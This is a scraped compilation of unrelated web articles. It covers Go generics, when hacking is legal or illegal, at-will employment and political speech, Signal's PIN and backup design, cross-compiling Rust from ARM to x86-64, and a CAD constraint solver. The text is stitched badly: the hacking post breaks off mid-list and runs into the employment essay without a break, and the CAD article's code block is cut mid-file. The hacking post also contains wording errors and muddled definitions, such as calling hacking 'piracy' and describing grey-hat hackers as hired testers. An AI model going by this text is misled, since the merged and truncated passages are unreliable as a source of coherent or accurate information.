<p>So that you can play with the current implementation of the generics proposal (for example to try the code samples in this tutorial), the Go team have provided a generics-enabled version of the Go Playground here:</p>
<p><a href="https://go2goplay.golang.org/">Golang generics playground</a></p>
<p>It works exactly the same way as the normal <a href="https://play.golang.org/">Go playground</a> we know and love, except that it supports the generic syntax described here. Because it's not possible to run all Go code in the playground (for example, code that makes network calls or accesses the filesystem), you can also try out the <a href="https://go.googlesource.com/go/+/refs/heads/dev.go2go/README.go2go.md">go2go tool</a>, which translates code using generics to code which compiles with the current version of Go.</p>
<h2 id="questions">Questions</h2>
<h3 id="will-golang-get-generics-">Will Golang get generics?</h3>
<p>Almost certainly yes. The current proposal for generics support in Go, as outlined in this tutorial, was announced in June 2020 in a blog post: <a href="https://blog.golang.org/generics-next-step">The Next Step for Generics</a>, and is being evaluated by the community. Since Go's lack of generics has often been cited as holding back the more widespread adoption of Go, the reaction has been generally positive.</p>
<p>The Golang generics roadmap currently specifies a possible release date as early as Go version 1.17, which would be in August 2021 (but it may not be as soon as that, depending on how much the current proposal evolves based on feedback).</p>
<p>Until then you can use the <a href="https://go2goplay.golang.org/">Generics Playground</a> to experiment with it and try out the examples here.</p>
<h3 id="generics-vs-interfaces-are-there-alternatives-to-generics-">Generics vs interfaces: are there alternatives to generics?</h3>
<p>As I mentioned in my <a href="https://bitfieldconsulting.com/golang/map-string-interface"><code>map[string]interface</code> tutorial</a>, we can already write Go code that handles values of any type, without using generic functions or types, by means of <em>interfaces</em>. However, if you want to write a library that implements things like collections of arbitrary types, using a generic type is much simpler and more convenient than using an interface.</p>
<h3 id="can-i-use-code-generation-instead-of-generics-">Can I use code generation instead of generics?</h3>
<p>The 'code generator' approach has been the other traditional way of dealing with such problems before the advent of generics in Go. Essentially, it involves using the <a href="https://blog.golang.org/generate"><code>go generate</code> tool</a> to produce Go code for each of the specific types that you need to handle in your library.</p>
<p>While this works, it's awkward to use, limited in its flexibility, and requires an extra build step. While code generation is still useful for some things, it's nice that we no longer have to use it to simulate generic functions and types in Go.</p>
<h3 id="what-are-contracts-">What are contracts?</h3>
<p>An earlier <a href="https://go.googlesource.com/proposal/+/master/design/go2draft-contracts.md">draft design</a> for generics in Go used a similar syntax to what we have today, but it implemented type constraints using a new keyword <code>contract</code>, instead of the existing <code>interface</code>. This was not popular for various reasons, and is now superseded.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Today, we will answer the question – <strong>when is hacking illegal and legal?</strong></span></p><p><span>Before we jump into the topic about when hacking is considered illegal and when it is considered legal, let’s try to understand what hacking is.</span></p><h2><b>What Is Hacking?</b></h2><p><span>There are many ways in which the process of hacking could be explained. It could be described as a breach of the system or unauthorized access. Still, hacking is an unwarranted attempt to infiltrate a computer or any other electronic system to attain information about something or someone.</span></p><p><span>Anytime we hear or read about someone’s computer or some network being hacked, we instantly picture an individual sitting in a dark room full of tangled wires, computer screens, and multiple keyboards, who is rapidly typing some programming language on one of the computer screens. While hacking is shown as something quite intriguing in motion pictures, in actuality, it is entirely different. Websites like SecureBlitz, </span><a href="http://techwhoop.com/" target="_blank" rel="noopener noreferrer"><span>Techwhoop.com</span></a>, and other cybersecurity blogs<span>&nbsp;can educate you with the measures you should take if your device is hacked.</span></p><p><span>The hacking scenes shown in the movies or T.V. shows are full of action, suspense, and drama, making it look enjoyable or entertaining. But in reality, hacking is quite dull. The hacker types a series of commands telling the computer system what to do, via a programming language like Python or Perl or LISP, and waits for the results, which might take hours, but the computer does the actual part of hacking. Along with being tedious and time-consuming, piracy is also complicated and sometimes dangerous.&nbsp;</span></p><p><span>Hackers use many different types of tools to hack into a software system. Few of these tools are:&nbsp;</span></p><ul><li><span><strong>Sn1per</strong> – It is a vulnerability scanner used by hackers to detect weak spots in a system or network.</span></li><li><span><strong>John The Ripper (JTR)</strong> – This is a favorite tool amongst hackers. It is used for cracking even the most complicated passwords in the form of a dictionary attack. A dictionary attack is a form of brute force where the hacker enters numerous passwords hoping to guess the right one eventually.</span></li><li><span><strong>Metasploit</strong> – This is a Penetration Testing Software. It is a hacking framework used to deploy payloads into vulnerabilities. It provides information about the weaknesses in software.</span></li><li><span><strong>Wireshark</strong> – It is a network traffic analyzer used for network troubleshooting and analysis.</span></li></ul><h3><b>There are three types of hackers –</b></h3><ul><li><span>The Black Hat Hackers,</span></li><li><span>The White Hat Hackers, and</span></li><li><span>The Grey Hat Hackers.</span></li></ul><p><span>The difference between each will be discussed below.</span></p><h2><b>When Is Hacking Illegal And Legal?</b></h2><p><a href="https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?ssl=1"><img title="when is hacking illegal and legal" src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?resize=640%2C432&amp;ssl=1" alt="when is hacking illegal and legal" width="640" height="432" srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?resize=300%2C203&amp;ssl=1 300w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?resize=177%2C118&amp;ssl=1 177w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?w=640&amp;ssl=1 640w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?resize=300%2C203&amp;ssl=1 300w, https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?resize=177%2C118&amp;ssl=1 177w" data-lazy-src="https://i2.wp.com/secureblitz.com/wp-content/uploads/2020/07/hat-hackers.jpg?resize=640%2C432&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>Hacking has always been portrayed as a felony, an unauthorized entry into a </span><a href="https://www.webopedia.com/TERM/N/network.html"><span>network</span></a><span>. But it started when MIT introduced the first computer hackers whose job was to modify the software to work better and faster. However, some people started using this software for felonious activities.&nbsp;</span></p><h2><b>When Is Hacking Illegal?</b></h2><p><span>When a hacker tries to breach a system without authorization, it is considered unlawful. These kinds of hackers are called Black Hat Hackers. They are the type of hackers who are known for their malicious and notorious reasons for hacking. Initially, hackers used to hack to show that they can breach a system. They used to cut just for fun.</span></p><p><span>Then some hack to expose someone or to leak information. For example, the group of hackers calling themselves “Anonymous,” who claim to have personal information about Donald Trump and were threatening to expose them. They are also threatening to reveal the “crimes” committed by the Minneapolis Police Department (MPD) following the murder of George Floyd.</span></p><p><span>Another example is when tens of thousands of messages from hacked emails were leaked from Clinton campaign chairman John Podesta’s Gmail account. The list goes on and on, as hackers don’t cut to prove a point or to expose someone. They hack for political reasons, for money, or are driven by some purpose or motive.</span></p><p><span>All of these actions are deemed illegal and felonious under the Computer Misuse Act (1990) along with other legislative acts such as the Data Protection Act (2018) and The Cybercrime Prevention Act of 2012.&nbsp;</span></p><h2><b>When Is Hacking Legal?</b></h2><p><span>Legal hacking is where the hacker is granted permission to hack into a system or network. This type of hacking is also known as Ethical Hacking. Since we live in a technological era, it has become easier for radical organizations to finance hackers to infiltrate security systems. This has resulted in a steady rise in cybercrime.&nbsp;</span></p><p><span>It has become imperative now more than ever for companies and governments to </span><a href="https://www.quora.com/What-is-legal-hacking#"><span>legally hack</span></a><span> into their operations to discover and fix vulnerabilities and prevent malicious and unlawful hacking from keeping the classified information safe. This type of hacking is done by either The White Hat Hackers or The Grey Hat Hackers.</span></p><p><span>The White Hat Hackers are those hackers who look for backdoors in the software when they are legally permitted to do so.</span></p><p><span>The Grey Hat Hackers are those hackers who are like Black Hat hackers but do not hack to cause any damage to any organization or people’s personal information or data. They are hired by companies or organizations to hack into their computer system and notify the administration if their order has any vulnerabilities. This is done so that these organizations can further secure their networks. Software companies make use of such hackers and hacking processes.</span></p><p><span>There are many types of ethical hacking. A few of them are</span></p><ul><li><span>Web Application Hacking,</span></li><li><span>System Hacking,</span></li><li><span>Web Server Hacking.</span></li></ul><h2><b>Commonly Used Hacking Techniques</b></h2><p><a href="https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?ssl=1"><img title="common hacking techniques black hat hackers grey hat hackers" src="https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?resize=640%2C432&amp;ssl=1" alt="common hacking techniques black hat hackers grey hat hackers" width="640" height="432" srcset="https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?w=640&amp;ssl=1 640w, https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?resize=300%2C203&amp;ssl=1 300w, https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?resize=177%2C118&amp;ssl=1 177w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?w=640&amp;ssl=1 640w, https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?resize=300%2C203&amp;ssl=1 300w, https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?resize=177%2C118&amp;ssl=1 177w" data-lazy-src="https://i0.wp.com/secureblitz.com/wp-content/uploads/2020/07/black-hat-hackers.jpg?resize=640%2C432&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><p><span>Here are the most common hacking techniques used by hackers:</span></p><ul><li><span><strong>SQL Injection Attack</strong> – SQL stands for Structured Query Language. </span><span>It is a programming language originally invented to manipulate and manage data in software or databases.</span></li><li><span><strong>Distributed Denial – of – Service (DDoS)</strong> – This technique is used to target websites to flood them with more traffic than the server can handle.</span></li><li><span><strong>Keylogger</strong> – It is a software that documents the key sequence in a log file on a computer that may contain personal email I.D.s and passwords.

While criticizing the government, or even waving the wrong flag, <a href="https://www.bbc.com/news/world-asia-china-53244862">could get you imprisoned</a> in any territory under Chinese rule, your right to freedom of expression is sacrosanct under the First Amendment—until you step into your place of work, that is. While the government is not entitled to punish political dissent, in most parts of America it is perfectly legal for your boss to fire you if they happen to dislike the person you voted for in the last election. </p><div><p>This restriction on political expression is especially harmful at a time when, nearly every day, somebody is accused of having transgressed against some commonly (or even not so commonly) held taboo. In many of these cases, employees—from senior staff at prominent institutions to working-class laborers—have been fired. Even outside of working hours, it would now be perfectly reasonable for most Americans to think twice before speaking their minds about hot-button issues.</p><p> In their attempts to remedy the most pernicious aspects of cancel culture, critics have mostly concentrated on advocating less punitive social norms. This is good as far as it goes. Our political culture will only become more liberal if we all stop demanding that people be punished or fired for imaginary transgressions. Yet, this emphasis on culture ignores the important role that legislative reform could play in defending the most vulnerable: If it were harder for employers to fire people for frivolous reasons, Americans would have less reason to fear that expressing their views might cost them their livelihoods.</p></div><p><strong>The Problem with At-Will Employment</strong></p><p>At the moment, most American workers are subject to “at-will” contracts. As long as their employers do not fire them on the basis of a narrow set of protected characteristics, such as gender, race, and sexual orientation, they can lose their jobs at any time, for any reason. Nor is there a due process requirement: Companies are under no legal obligation to investigate whether the ostensible reasons for axing an employee are grounded in reality. (The only state that categorically prohibits at-will employment, after six months on the job, <a href="https://spoonlaw.com/437-2/">is Montana</a>). </p><div><p> The prevalence of at-will employment makes it easier for employers to engage in knee-jerk reactions to short-lived social media controversies. For instance, a Hispanic electrician working for the San Diego Gas and Electric company was fired for cracking his knuckles in a photograph because a <a href="https://www.nbcsandiego.com/news/local/sdge-worker-fired-over-alleged-racist-gesture-says-he-was-cracking-knuckles/2347414/">social media mob believed that he was</a> flashing a white power sign. The man who took the picture has since admitted that he probably misinterpreted the interaction, and thousands of people have now <a href="https://www.change.org/p/sdge-reinstate-emmanuel-caffertys-job-sdge">signed a petition</a>, asking the electrician’s former employer to reverse the mistake. But since the employee has already lost his job, it will be hard for him to obtain justice. As in many other cases, both parties would have been better off if the law had required the company to afford due process to an accused worker <em>before</em> deciding whether or not to fire him. </p><p> There is a better alternative: Contracts negotiated by labor unions often provide so-called “just cause” protections for employees. The tests of just cause <a href="https://www.massnurses.org/labor-action/labor-education-resources/grievances-101/just-cause#:~:text=Just%20cause%20is%20the%20standard,must%20be%20just%20and%20fair.&amp;text=The%20concept%20of%20just%20cause%20is%20well%20established%20in%20labor%20law.">typically include questions</a> such as whether the employee was forewarned of the consequences of his or her actions, whether the rules were applied evenly, and whether there was an objective investigation into the employee’s conduct. In other words, it forces employers to conduct a fair process before firing their employees, which gives the accused a real chance to defend themselves. If we really care about free speech and due process, these protections should be available to every American.</p></div><div><p>Opponents of these reforms have long argued that they would come at a heavy cost to the economy. But scholars who have studied the impact of wrongful discharge protections have obtained mixed results. <a href="https://www.nber.org/papers/w12860.pdf">One 2007 study of U.S. employers</a>, for example, found that the introduction of such protections resulted in some loss of productivity, but also led to strong growth in overall employment numbers.</p></div><p><strong>Stop Employers From Discriminating Against Views They Don’t Like</strong></p><p> Just cause legislation would help to reduce the number of capricious firings. But, as long as bosses can legally terminate employees because they dislike their political views, such legislation would only go partway towards remedying the chilling effects on free speech. That’s why those of us who worry about cancel culture should also push for the inclusion of political affiliation in the rubric of anti-discrimination laws. </p><p> The Civil Rights Act has long prohibited employers from discriminating on the basis of race, color, religion, gender, pregnancy, or national origin. In June, the Supreme Court <a href="https://www.npr.org/2020/06/15/863498848/supreme-court-delivers-major-victory-to-lgbtq-employees">ruled that this provision</a> also protects gay, lesbian, and transgender employees. But there are no equivalent federal protections to prevent employees from being disadvantaged because of their political views.</p><div><p>This is a missed opportunity, as the success of local ordinances mandating such protections has shown. In Washington D.C., for example, the <a href="https://ohr.dc.gov/sites/default/files/dc/sites/ohr/publication/attachments/LawsAndRegs-HumanRightsAct-1977-English.pdf">Human Rights Act</a> prohibits employment discrimination based on political affiliation, defined as “the state of belonging to or endorsing any political party.” As Edgar Njatou, Executive Director of Workplace Fairness, told me in an interview, this ensures that your boss can’t fire you if they “find out you voted for Hillary or that you’re a Republican.”</p><p> Seattle has even more ambitious protections for workers’ political views. Its laws prohibit discrimination based on “<a href="https://library.municode.com/wa/seattle/codes/municipal_code?nodeId=TIT14HURI_CH14.06UNPUACPR&amp;showChanges=true">political ideology</a>,” which is defined as “any idea or belief … relating to the purpose, conduct, organization, function or basis of government institutions and activities, whether or not characteristic of any political party or group.” But even this law mostly serves to protect people with relatively common political views. After the 2016 election, for example, local rental listings began to discourage Trump supporters from applying. “If you are a landlord,” city government spokesperson Elliot Bronstein, <a href="https://www.king5.com/article/news/local/seattle/no-trump-clause-is-new-requirement-for-some-seattle-renters/416269805">wrote in response</a>, “you cannot discriminate on political status.” (Like other protections against discrimination, this does not apply to housemates, who share an apartment or living space.) </p></div><p>There are two obvious objections—both of which could easily be addressed. First, some organizations have a legitimate interest in ensuring that their employees share a broad worldview: It would make no sense, for example, to stop a political campaign group from discriminating against a job applicant who opposes the organization’s goals. Explicitly political organizations should therefore enjoy a carve-out from the stricture against discriminating on the basis of political beliefs (though they would still have to afford existing employees the due process protections guaranteed under “just cause” provisions). </p><p>Second, employers have a legitimate interest in protecting their staff from the hateful conduct of colleagues: Clearly, for example, no member of an ethnic minority should have to endure racist taunts at their place of work. But this could also be addressed through carefully worded legislation. Seattle already offers exemptions for political conduct that would cause “substantial and material disruption of the property rights of the provider of a place of public accommodation.” Employers also have an affirmative obligation to protect employees from racist harassment.</p><p>Balancing competing goods is one of the core purposes of any legal system. There is no reason to think that our laws could not protect the speech of political minorities, without hampering the operation of overtly political organizations or burdening ethnic, religious, or sexual minorities with the fear of harassment.</p><p><strong>We Can Make It Happen</strong></p><p>New employment regulations always face an especially tough uphill battle in Congress. But, though it will not be easy to win legislative approval for such reforms, every major faction of American political life has its own reasons for supporting them. </p><p>The left should be sympathetic to the wish to expand job protections for American workers, which lag significantly behind those of other developed countries. While conservatives are usually hostile to such regulations, they should recognize that these reforms would help to protect them against the growing influence of cancel culture.

<p>There is currently a lot of discussion around Signal’s new <a href="https://signal.org/blog/signal-pins/">PIN</a> decisions. In particular, the discussions have focused on the decision to use the PIN as a seed to encrypt backup data that will be stored on Signal servers using Secure Value Recovery (SVR). So user data will be stored in a way so that even Signal cannot access it. SVR uses <a href="https://en.wikipedia.org/wiki/Software_Guard_Extensions">Intel SGX</a> to ensure this.</p>
<p>This week there was <a href="https://blog.cryptographyengineering.com/2020/07/10/a-few-thoughts-about-signals-secure-value-recovery/">an excellent post</a> by <a href="https://twitter.com/matthew_d_green">Matthew Green</a>, a cryptographer and professor at Johns Hopkins University, where he discussed some of the concerns he has with Signal’s SVR system, especially around SGX. He also touched on the rollout methods and delivery Signal has used to communicate this new feature. It’s an excellent breakdown and I can’t effectively summarize it here, I highly recommend reading it.</p>
<p>(To <em>ineffectively</em> summarize it however, SGX isn’t foolproof and has had issues in the past. Signal is pushing this hard on users without a lot of context or easily understood options for disabling SVR.)</p>
<p>Matthew’s criticisms are all valid and I don’t disagree at all. But I want to add something to the discussion that is being mostly omitted – the network effect of a messaging app, and the considerations Moxie and Signal have to take into consideration to effectively secure your and my communications.</p>
<p>Signal must take into account multiple users accessing identical data as a first-class concern. Every communication you have on Signal must be decrypted by an endpoint you don’t control – the device of the person you’re messaging. A similar use case is email. Hypothetically, let’s say you avoid Google like the plague. Even then, approximately 50% of your email will still reside on Google servers due to your recipients using either Gmail or G Suite.</p>
<p>As Signal is a closed(ish) ecosystem, unlike email, they have to deal with this concern too. Not only do they have to make sure that the security on your endpoint is as strong as possible, but they also have to make sure the same is true of the other endpoints where you’re sending data.</p>
<p>In this situation Signal has to consider that doing what many suggest and making SVR as an opt-in, or not offering at all will likely <em>reduce</em> adoption by a broader userbase, who want things like contact syncing, and easy backups. So while adding user choice may make <em>my</em> data storage more secure, the fact that it hurts adoption means a smaller percentage of my communications will be end-to-end encrypted at all because they’ll go over channels like Slack, email, or SMS.</p>
<p>It is worth keeping in mind that Signal is maintaining not only an application, but an ecosystem, and the security considerations must take both areas into account. It is better, in my mind, to have a goal of really good security on the majority of my communications, as opposed to exceptional security on just some of my communications. And Signal has always been a secure messaging player in the consumer and non-expert space, as opposed to something like Keybase which targets more knowledgeable users and makes different tradeoffs accordingly.</p>
<p>As Matt says in his post, criticizing Signal is difficult as their overall work is great, and I’m glad the criticism and discussion are happening. We should continue to hold them to a high standard. But the network effects and ecosystem should be considered as much as the application and security architecture. If they aren’t then we risk repeating the mistakes of PGP email where we have an amazingly secure system that is rarely used in practice.</p>

July 16, 2020 | https://burgers.io/cross-compile-rust-from-arm-to-x86-64 | <a href="https://web.archive.org/web/*/https://burgers.io/cross-compile-rust-from-arm-to-x86-64">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p>It’s 2020. The world is abuzz with, well – <em>waves hand</em> – all this. But it's
also abuzz with <a href="https://en.wikipedia.org/wiki/ARM_architecture">ARM</a>: Apple is moving their Mac line to Apple Silicon, Amazon
has been been touting their Gravaton2-based infrastructure, Cloudflare is said
to be going all ARM on their edge nodes, and the <a href="https://www.anandtech.com/show/15869/new-1-supercomputer-fujitsus-fugaku-and-a64fx-take-arm-to-the-top-with-415-petaflops">world's fastest supercomputer
is built on ARM</a>.</p>
<p>For a long time, I – and I think many others – held the idea that <a href="https://en.wikipedia.org/wiki/X86-64">x86-64</a> is
for heavy workloads and ARM is for the "little stuff" like embedded systems and
Raspberry Pis.</p>
<p>And that’s why you can find tons of articles online for how to cross-compile
Rust <em>from</em> x86-64 <em>to</em> ARM.</p>
<p>I want to cross-compile the other way.</p>
<p>At <a href="https://zenlist.com/">Zenlist</a>, we use Rust to run our entire fleet of lambdas (around 90 of
them).</p>
<p>Amazon has been talking up their beefy Gravaton2-based ARM instances. But right
now, <a href="https://aws.amazon.com/lambda/">lambda</a> – which feels to me like the "little stuff" because of their
low-memory/low-CPU settings – only runs on x86-64.</p>
<p>I decided we needed to figure out how to build our lambda runtimes from an ARM
server: I needed to cross-compile Rust <em>from</em> ARM <em>to</em> x86-64.</p>
<hr>
<p>So here we go.</p>
<h2>Getting started</h2>
<p>I launched two Ubuntu 20.04 instances: a <a href="https://aws.amazon.com/ec2/instance-types/c6/">c6g.medium</a> for the build
machine and a <a href="https://aws.amazon.com/ec2/instance-types/t3/">t3.micro</a> as an x86-64 to run the results on. (Cut me some
slack here! Including how to compile and run on lambda would make this article
quite a bit longer!)</p>
<p>Log into that build machine and lets get started. A quick visit to <a href="https://rustup.rs/">rustup.rs</a>
to install Rust, of course.</p>
<p>And a <code>apt-get install -y build-essential</code> for all of the other tools we need.</p>
<p>And finally,</p>
<pre><code>$ cargo new --bin crossed
$ cargo run
Hello, world!
</code></pre>
<p>gets a nice little greeting printed the to the screen. We're in business!</p>
<h2>Cross compile!</h2>
<p>Alright, so now we want to cross compile this admittedly awesome project to run
on the target machine.</p>
<p>We'll start in the usual place: adding a new target.</p>
<pre><code>rustup target add x86_64-unknown-linux-musl
</code></pre>
<p>On lambda, it's nice to use the <code>musl</code> target to get everything statically
linked together.</p>
<p>Alright, let's give it a try.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
error: linking with `cc` failed: exit code: 1
</code></pre>
<p>Well bummer. I was really hoping that would Just Work™. No need to panic yet,
because I remember from reading other articles like <a href="https://rendered-obsolete.github.io/2019/03/19/rust_lambda.html">Rust on
Lambda</a> and <a href="https://sigmaris.info/blog/2019/02/cross-compiling-rust-on-mac-os-for-an-arm-linux-router/">Cross compiling Rust on Mac OS for an ARM
Linux router</a> that we probably just need to configure a
cross-compiling linker.</p>
<p>Alright, so we need to install a cross compiler.</p>
<pre><code>sudo apt install gcc-x86-64-linux-gnu
</code></pre>
<p>Then we need to set it up by throwing this in <code>~/.cargo/config</code>.</p>
<pre><code>[target.x86_64-unknown-linux-musl]
linker = "x86_64-linux-gnu-gcc"
</code></pre>
<p>And now, <code>cargo build --release --target x86_64-unknown-linux-musl</code> works
great!</p>
<h2>And it works on the target machine, right?</h2>
<p>Well, I had better make sure. That's why I spun up the target machine, after
all.</p>
<pre><code>$ scp target/x86_64-unknown-linux-musl/release/crossed ubuntu@target-machine:.
$ ssh ubuntu@target-machine ./crossed
Hello, world!
</code></pre>
<p>🎉🏆</p>
<h2>The author counts his chickens before they hatch</h2>
<p>So that's how to cross-compile for x86-64 lambda from an ARM machine! Publish
this post. <a href="https://developers.google.com/search/docs/guides/submit-URLs">Submit the sitemap to Google</a>. Actually, hey, we can
probably do that right from this project!</p>
<p>I'll just add <a href="https://docs.rs/reqwest">reqwest</a> to the <code>Cargo.toml</code>.</p>
<pre><code>[dependencies]
reqwest = { version = "0.10", default-features = false, features = ["rustls-tls", "blocking"] }
</code></pre>
<p>And write up some quick code to notify Google that my sitemap has changed, and
it should index this clearly-complete-and-not-missing-anything article.</p>
<pre><code>fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    let client = reqwest::blocking::Client::default();
    let url = "http://www.google.com/ping?sitemap=https://burgers.io/sitemap.xml";
    let status = client.get(url)
        .send()?
        .status();

    println!("{:?}", status);

    Ok(())
}
</code></pre>
<p>And cross-compile it while I get a celebratory drink.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
error: failed to run custom build command for `ring v0.16.15`
</code></pre>
<h2>Wait, what?</h2>
<p>Everything was sailing along so smoothly! What happened?</p>
<p>Not-rust happened.</p>
<p>I told <em>Cargo</em> about my cross-compiler. But <a href="https://docs.rs/ring">ring</a> – a crypto library that
reqwest uses – uses some code that isn't Rust, and it had no way to know about
my cross compiler.</p>
<p>Let's take a longer look at more of the error log.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
error: failed to run custom build command for `ring v0.16.15`

Caused by:
  process didn't exit successfully: `/home/ubuntu/crossed/target/release/build/ring-082dc03a36bb5ba5/build-script-build` (exit code: 101)
--- stdout
OPT_LEVEL = Some("3")
TARGET = Some("x86_64-unknown-linux-musl")
HOST = Some("aarch64-unknown-linux-gnu")
CC_x86_64-unknown-linux-musl = None
CC_x86_64_unknown_linux_musl = None
TARGET_CC = None
CC = None
CROSS_COMPILE = None
CFLAGS_x86_64-unknown-linux-musl = None
CFLAGS_x86_64_unknown_linux_musl = None
TARGET_CFLAGS = None
CFLAGS = None
CRATE_CC_NO_DEFAULTS = None
DEBUG = Some("false")
CARGO_CFG_TARGET_FEATURE = Some("fxsr,sse,sse2")
</code></pre>
<p>Yep, yep, looks good, target is <code>x86_64-unknown-linux-musl</code>, host is
<code>aarch64-unknown-linux-gnu</code>, uh huh, yep, <strong>oh</strong>.</p>
<p>That's interesting.</p>
<p>There's an environment variable there – <code>CC_x86_64_unknown_linux_musl</code> – that
looks like it's expecting the exact cross-compiler to use. And it's empty.</p>
<p>Well, let's change that! Using the exact same cross-compiler that we specified
in the cargo config, let's set that environment variable.</p>
<pre><code>$ export CC_x86_64_unknown_linux_musl=x86_64-linux-gnu-gcc
</code></pre>
<p>And then 🤞.</p>
<pre><code>$ cargo build --release --target x86_64-unknown-linux-musl
</code></pre>
<p>It worked! Throw it over to the target machine and give it a try!</p>
<pre><code>$ scp target/x86_64-unknown-linux-musl/release/crossed ubuntu@target-machine:.
$ ssh ubuntu@target-machine ./crossed
200
</code></pre>
<p>Nice.</p>
<h2>Some final notes</h2>
<p>As bullet points? Why not.</p>
<ul>
<li>Make sure <code>CC_x86_64_unknown_linux_musl</code> is permanently in your environment
somehow. For us, this involved adding it to the environment section for
self-hosted GitHub runners.</li>
<li>In my specific testing for our specific projects, compilation times were up
to about 10% slower than on a corresponding <a href="https://aws.amazon.com/ec2/instance-types/c5/">c5</a> instance. But the cost
tradeoff was worth it.</li>
<li>I'm holding out hope that AWS will give us ARM-based lambdas in the future.</li>
<li>No instances were harmed while writing this article. Well, except the ones I
terminated. Which reminds me to remind you: if you were following along at
home, now might be a good time to terminate your instances.</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A really powerful tool in Computer Aided Design (CAD) is the ability to apply
<em>“constraints”</em> to your drawing. Constraints are a really powerful tool,
allowing the drafter to declare how parts of their drawing are related, then
letting the CAD program figure out how parameters can be manipulated in such
a way that</p><p>You can think of a constraint as some sort of mathematical relationship between
two or more parameters.</p><p>Some examples are:</p><ul><li><em>“This interior angle is 45°”</em></li><li><em>“That line is vertical”</em></li><li><em>“Side A is perpendicular to side B”</em></li></ul><p>Graphically they’ll be displayed something like this:</p><figure><a href="http://solvespace.com/constraints.pl"><img src="https://raw.githubusercontent.com/solvespace/solvespace-web/dc2f3ed070d58eb827617633cd4bdc52b8c0ba00/pics/constraints-triangle-dim-2.png" alt="A constrained triangle in SolveSpace"></a><figcaption><p>A constrained triangle in <a href="http://solvespace.com/">SolveSpace</a></p></figcaption></figure><p>These constraints are declared mathematically, so a <em>“This line is vertical”</em>
constraint may be written as $line.start.x - line.end.x = 0$ and
$line.start.z - line.end.z = 0$ (assuming the $x$ axis is to the right and
the $z$ comes out of the page).</p><p>In response to input from the user (e.g. they click on the line and drag it
to the left), a constraint system will feed the perturbation into the system
of equations (e.g. the $line.start.y$ changes by $-0.1$ units) and based on
the available constraints and tie-breaking heuristics, it will figure out how
much each remaining variable must change. Execute at 60 FPS and you’ve got an
interactive, parametric CAD application.</p><p>A constraint solver is a fairly complex system, but the first step is teaching
it how to manipulate and evaluate abstract maths.</p><div><p>The code written in this article is available <a href="https://github.com/Michael-F-Bryan/constraints">on GitHub</a>. Feel free to
browse through and steal code or inspiration.</p><p>If you found this useful or spotted a bug, let me know on the blog’s
<a href="https://github.com/Michael-F-Bryan/adventures.michaelfbryan.com">issue tracker</a>!</p></div><h2 id="the-expression-tree">The Expression Tree</h2><p>For this constraint solver we need a way to represent algebraic expressions like
$x - 5$ or $sin(x) + y*y - x*y$, and the most natural form is the <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree"><em>Abstract
Syntax Tree</em></a>.</p><p>In this language, an expression can be:</p><ul><li>A (possibly unnamed) parameter</li><li>A floating-point constant</li><li>A call to a function with a single argument</li><li>Negation, and</li><li>A binary operation (e.g. <code>x + y</code>, where <code>x</code> and <code>y</code> are the <code>left</code> and <code>right</code>
operands, and we’re using the <code>+</code> operator)</li></ul><p>Our constraint solver is considerably less complex than a general purpose
programming language, so most of our <em>Abstract Syntax Tree</em> can fit into a
couple simple types.</p><div><pre><code data-lang="rust"><span>// src/expr.rs

I’d like to direct your attention to two details…</p><ol><li>Text fields use a <a href="https://crates.io/crates/smol_str"><code>smol_str::SmolStr</code></a>
instead of a normal <code>String</code></li><li>Each child node is behind a reference-counted pointer</li></ol><p>We’re using <code>SmolStr</code> for something called the <a href="https://stackoverflow.com/questions/10315041/meaning-of-acronym-sso-in-the-context-of-stdstring/10319672#10319672"><em>Small String Optimisation</em></a>.
This is where small amounts of text can be stored inline on the stack (in place
of the data pointer, length, and capacity fields in a normal <code>String</code>) to skip
a heap allocation and a layer of indirection.</p><p>The small string optimisation is useful when you’re dealing with a large
number of small strings (like programming language identifiers) because it
helps avoid heap fragmentation and locality. Cloning a <code>SmolStr</code> is also
quite cheap because even if it isn’t small, a reference-counted string
(analogous to <code>Arc&lt;str&gt;</code>) is used when we need to store large strings on the
heap.</p><p>A conscious design decision is to <em>make the AST immutable</em>. Most operations
applied to an <code>Expression</code> will leave part of the tree unchanged, and seeing
